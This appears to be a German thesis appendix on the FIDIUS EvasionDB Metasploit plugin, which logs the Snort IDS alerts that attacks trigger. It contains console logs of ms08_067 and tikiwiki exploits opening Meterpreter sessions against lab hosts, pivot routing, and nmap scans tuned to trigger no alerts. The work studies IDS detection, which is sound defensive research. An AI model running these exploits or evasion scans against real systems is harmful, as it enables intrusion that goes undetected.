\chapter[Anhang]
  {Anhang}
\label{chp:anhang}

\section{Anhang}
\subsection{EvasionDB-Beispiel}
\begin{lstlisting}[label=evasion-db-sample]
  msf > load evasiondb
  [*] EvasionDB plugin loaded.
  [*] Successfully loaded plugin: FIDIUS-EvasionDB
  msf > use exploit/windows/smb/ms08_067_netapi
  msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
  PAYLOAD => windows/meterpreter/bind_tcp
  msf exploit(ms08_067_netapi) > set RHOST 10.20.20.1 $ RHOST => 10.20.20.1
  msf exploit(ms08_067_netapi) > exploit
  [*] Started bind handler
  [*] Automatically detecting the target...
  [*] Fingerprint: Windows XP - Service Pack 2 - lang:German
  [*] Selected Target: Windows XP SP2 German (NX) $
  [*] Attempting to trigger the vulnerability...
  [*] Sending stage (749056 bytes) to 10.20.20.1
  [*] Meterpreter session 1 opened (10.0.0.100:52764 -> 10.20.20.1:4444) at 2011-03-28 16:42:53 +0200
  meterpreter > exit
  [*] Meterpreter session 1 closed.  Reason: User exit
  msf exploit(ms08_067_netapi) > show_events
  ------------------------------------------------------------
  exploit/windows/smb/ms08_067_netapi with 47 options
  ------------------------------------------------------------
  11 idmef-events fetched
  ------------------------------------------------------------
  (1)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
  (2)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
  (3)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
  (4)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
  (5)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
  (6)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
  (7)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (8)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (9)ET EXPLOIT x86 JmpCallAdditive Encoder with 759 bytes payload
  (10)ET EXPLOIT x86 JmpCallAdditive Encoder with 467 bytes payload
  (11)NETBIOS SMB-DS IPC$ share access with 72 bytes payload
  msf exploit(ms08_067_netapi) >
\end{lstlisting}

\subsection{False-Positive-Generierung}
\begin{lstlisting}[label=generate-false-positive]
  msf > load evasiondb
  [*] EvasionDB plugin loaded.
  [*] Successfully
  loaded plugin: FIDIUS-EvasionDB
  msf > set_autologging false
  msf >fetch_events
  [*] 0 events generated
  msf > use auxiliary/ids/false_positive/netbios_share_access
  msf auxiliary(netbios_share_access) > set RHOST 10.20.20.1
  RHOST => 10.20.20.1
  msf auxiliary(netbios_share_access) > run
  [*] Auxiliary
  module execution completed
  msf auxiliary(netbios_share_access) > fetch_events
  [*] 1 events generated (81)
  Event(NETBIOS SMB-DS IPC$  share access) : 72 bytes payload (10.0.0.101 -> 10.20.20.1)
\end{lstlisting}

\subsection{False-Positive-Generierung über Pivot-Host}
\begin{lstlisting}[label=false-positive-pivot]
  msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec
  msf exploit(tikiwiki_graph_formula_exec) > set RHOST 10.20.20.70
  RHOST =>10.20.20.70
  msf exploit(tikiwiki_graph_formula_exec) > set PAYLOAD
  php/meterpreter/bind_tcp
  PAYLOAD => php/meterpreter/bind_tcp msf
  exploit(tikiwiki_graph_formula_exec) > exploit
  [*] Attempting to obtain database credentials...
  [*] Started bind handler
  [*] Attempting to execute our payload...
  [*] Sending stage (31113 bytes) to 10.20.20.70
  [*] Meterpreter session 1 opened (10.0.0.101:45263 -> 10.20.20.70:4444) at 2011-04-06 16:53:23 +0200 meterpreter > background
  msf exploit(tikiwiki_graph_formula_exec) > back
  msf > route add 10.20.20.0 255.255.255.0 1
  msf > route print
  Active Routing Table
  ====================
    Subnet      Netmask         Gateway
    ------      -------         -------
    10.20.20.0  255.255.255.0   Session 1

  msf > use auxiliary/ids/false_positive/netbios_share_access
  msf auxiliary(netbios_share_access) > set RHOST 10.20.20.1
  RHOST => 10.20.20.1
  msf auxiliary(netbios_share_access) > run
  [*] Auxiliary module execution completed
  msf auxiliary(netbios_share_access) > fetch_events (96) Event(NETBIOS SMB-DS IPC$ share access) : 72 bytes payload (10.20.20.70 -> 10.20.20.1)
  msf auxiliary(netbios_share_access) >
\end{lstlisting}

\textbf{nmap 10.20.20.1}

\begin{verbatim}
  25 events generated
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:33570 -> 10.20.20.1:5901
  ET SCAN Potential VNC Scan 5800-5820: 10.0.0.100:35372 -> 10.20.20.1:5802
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:40082 -> 10.20.20.1:5915
  SNMP AgentX/tcp request: 10.0.0.100:49644 -> 10.20.20.1:705
  SNMP AgentX/tcp request: 10.0.0.100:49644 -> 10.20.20.1:705
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:50473 -> 10.20.20.1:5906
  ET POLICY Suspicious inbound to PostgreSQL port 5432: 10.0.0.100:39823 -> 10.20.20.1:5432
  ET POLICY Suspicious inbound to PostgreSQL port 5432: 10.0.0.100:39823 -> 10.20.20.1:5432
  ...
\end{verbatim}

\subsection{NMap-Evasion-Tests}
\label{nmap-evasion-tests}
\textbf{nmap 10.20.20.1}

\begin{verbatim}
  25 events generated
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:33570 -> 10.20.20.1:5901
  ET SCAN Potential VNC Scan 5800-5820: 10.0.0.100:35372 -> 10.20.20.1:5802
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:40082 -> 10.20.20.1:5915
  SNMP AgentX/tcp request: 10.0.0.100:49644 -> 10.20.20.1:705
  SNMP AgentX/tcp request: 10.0.0.100:49644 -> 10.20.20.1:705
  ET SCAN Potential VNC Scan 5900-5920: 10.0.0.100:50473 -> 10.20.20.1:5906
  ET POLICY Suspicious inbound to PostgreSQL port 5432: 10.0.0.100:39823 -> 10.20.20.1:5432
  ET POLICY Suspicious inbound to PostgreSQL port 5432: 10.0.0.100:39823 -> 10.20.20.1:5432
  ...
\end{verbatim}

\textbf{nmap -p 80,443,21,22,25,135,139,445,3306,3389 10.20.20.1}

\begin{verbatim}
  3 events generated
  (portscan) TCP Portscan: 10.0.0.100: -> 10.20.20.1:
  ET POLICY Suspicious inbound to mySQL port 3306: 10.0.0.100:37177 -> 10.20.20.1:3306
  ET POLICY Suspicious inbound to mySQL port 3306: 10.0.0.100:37177 -> 10.20.20.1:3306
\end{verbatim}

\textbf{nmap -T polite -p 80,443,21,22,25,135,139,445,3306,3389 10.20.20.1}

\begin{verbatim}
  2 events generated
  ET POLICY Suspicious inbound to mySQL port 3306: 10.0.0.100:37189 -> 10.20.20.1:3306
  ET POLICY Suspicious inbound to mySQL port 3306: 10.0.0.100:37189 -> 10.20.20.1:3306
\end{verbatim}

\textbf{sudo nmap -T polite -sN -PN -p 3306 10.20.20.1}

\begin{verbatim}
  0 events generated
\end{verbatim}

\subsection{Snortor Verwendung}
\label{snortor-usage}

\begin{lstlisting}
  msf > load evasiondb loading snort_fetcher
  [*] EvasionDB plugin loaded.
  [*] Successfully loaded plugin: FIDIUS-EvasionDB
\end{lstlisting}
\
\textit{import\_rules} liest alle Regeln in die EvasionDB ein. Dies
kann auch remote über SCP stattfinden, wenn die Verbindungsdaten
konfiguriert sind. Es muss zuerst ein Import stattfinden, bevor ein
Set von Aktiv/Inaktiv geschalteten Regeln einem Exploit hinzugefügt
werden kann.

\begin{lstlisting}
  msf > import_rules
  msf > Import needed 1.695100059 seconds
\end{lstlisting}

Es wird normal ein Exploit ausgeführt.

\begin{lstlisting}
  msf > use exploit/windows/smb/ms08_067_netapi
  msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/bind_tcp
  PAYLOAD => windows/meterpreter/bind_tcp
  msf exploit(ms08_067_netapi) > set RHOST 10.20.20.1
  RHOST => 10.20.20.1 msf
  exploit(ms08_067_netapi) > exploit
  [*] Started bind handler
  [*] Automatically detecting the target...
  [*] Fingerprint: Windows XP - Service Pack 2 - lang:German
  [*] Selected Target: Windows XP SP2 German (NX)
  [*] Attempting to trigger the vulnerability...
  [*] Sending stage (749056 bytes) to 10.20.20.1
  [*] Meterpreter session 1 opened (10.0.0.100:37383 -> 10.20.20.1:4444) at 2011-06-09 14:41:28 +0200

  meterpreter > exit

  [*] Meterpreter session 1 closed.  Reason: User exit
\end{lstlisting}

Die EvasionDB speichert alle generierten IDMEF-Events zu dem Angriff.

\begin{lstlisting}
  msf exploit(ms08_067_netapi) > show_events
  ------------------------------------------------------------
  (1)exploit/windows/smb/ms08_067_netapi with 48 options
  ------------------------------------------------------------ 7
  idmef-events fetched
  ------------------------------------------------------------
  (1)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (2)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (3)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
  (4)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
  (5)ET ATTACK_RESPONSE Rothenburg Shellcode with 763 bytes payload
  (6)ET EXPLOIT x86 PexFnstenvMov/Sub Encoder with 763 bytes payload
  (7)NETBIOS SMB-DS IPC$ share access with 72 bytes payload
\end{lstlisting}

Nachdem ca. 16k Regeln via \textit{import\_rules} importiert wurden
kann zum dem Angriff gespeichert werden, welche Regeln aktiv/inaktiv
sind. Diese Daten werden als großer Bitvector in der DB gespeichert. 1
heißt Regel ist aktiv. 0 heißt Regel ist nicht aktiv. Bei den
Snortregeln ist es gängige Praxis Regeln zu deaktivieren, indem man
sie auskommentiert. Das Snortor-Gem ist fähig Regeln zu unterscheiden,
ob eine Regel auskommentiert(inaktiv) oder einkommentiert(aktiv)
ist. Man sieht dann bei der Übersicht, dass \enquote{Rules: 15177/15897}
15177 Regeln von insgesamt 15897 Regeln aktiv sind.

\begin{lstlisting}
  msf exploit(ms08_067_netapi) > assign_rules_to_attack 1
  msf > show_events
  ------------------------------------------------------------
  (1)exploit/windows/smb/ms08_067_netapi with 48 options
  ------------------------------------------------------------
  7 idmef-events fetched
  ------------------------------------------------------------
  ------------------------------------------------------------
  Rules: 15177/15897
  ------------------------------------------------------------
  (1)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (2)ET POLICY PE EXE or DLL Windows file download with 1324 bytes payload
  (3)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 1324 bytes payload
  (4)COMMUNITY SIP TCP/IP message flooding directed to SIP proxy with 0 bytes payload
  (5)ET ATTACK_RESPONSE Rothenburg Shellcode with 763 bytes payload
  (6)ET EXPLOIT x86 PexFnstenvMov/Sub Encoder with 763 bytes payload
  (7)NETBIOS SMB-DS IPC$ share access with 72 bytes payload
\end{lstlisting}

Das Snortor-Gem bietet noch Find-Funktionen, um beispielsweise die
Regel für ein IDMEF-Event zu finden.

\begin{lstlisting}
  msf > irb
  >> FIDIUS::EvasionDB.current_rule_fetcher.import_rules_to_snortor
  >> Snortor.find_by_msg "ET POLICY PE EXE or DLL Windows file download"
  => alert tcp $EXTERNAL_NET any -> $HOME_NET any ( classtype:policy-violation; content:"PE"; distance: 0; flow: established; flowbits:set,ET.http.binary; isdataat: 10,relative; msg:"ET POLICY PE EXE or DLL Windows file download"; reference:url,www.emergingthreats.net/cgi-bin/cvsweb.cgi/sigs/POLICY/POLICY_Binary_Downloads; rev:12
  ; sid: 2000419; )

  >> Snortor.find_by_msg "COMMUNITY SIP TCP/IP message flooding directed to SIP proxy"
  => alert ip any any -> any 5060 ( classtype:attempted-dos; msg:"COMMUNITY SIP TCP/IP message flooding directed to SIP proxy"; rev:2
  ; sid:100000160; threshold: type both, track by_src, count 300, seconds 60; )

\end{lstlisting}
